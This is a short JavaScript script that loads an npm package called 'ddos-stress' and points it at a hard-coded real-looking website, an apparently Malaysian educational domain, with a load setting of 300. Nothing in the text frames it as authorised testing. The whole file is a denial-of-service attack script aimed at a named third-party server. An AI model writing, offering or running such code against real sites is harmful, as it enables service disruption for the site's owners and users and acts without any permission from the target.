var Stress = require("ddos-stress");

// Create new instance of DDoS Stress
var stress = new Stress();

// Run stress on server
const url = "http://bac.edu.my";
stress.run(url, 300);
